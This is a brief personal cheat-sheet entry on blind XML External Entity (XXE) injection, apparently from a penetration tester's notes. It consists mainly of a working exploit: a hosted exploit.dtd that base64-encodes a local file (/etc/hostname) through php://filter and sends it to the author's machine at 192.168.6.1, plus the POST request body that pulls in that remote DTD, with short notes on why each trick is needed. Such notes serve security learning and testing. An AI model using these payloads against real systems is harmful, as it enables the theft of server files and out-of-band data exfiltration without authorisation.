# XML External Entities Injection (XXE)

## **Blind XXE**

{% embed url="https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9" %}
\

{% endembed %}

Example exploit.dtd:

```
<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hostname">
<!ENTITY % remote
"<!ENTITY &#37; send SYSTEM 'http://192.168.6.1/%payload;'>">
%remote;
%send;

```

Corresponding POST request payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE load SYSTEM "http://192.168.6.1/exploit.dtd">
<root><email>asd</email><password>asd</password></root>
```

Where exploit.dtd is a file that is hosted on my computer, on IP address 192.168.6.1.

The reason I’m hosting the file is because parameter entity references aren’t allowed in the payload.

PHP doesn’t allow newlines in an URL, which is why I had to use the php:// to base64 encode the payload.
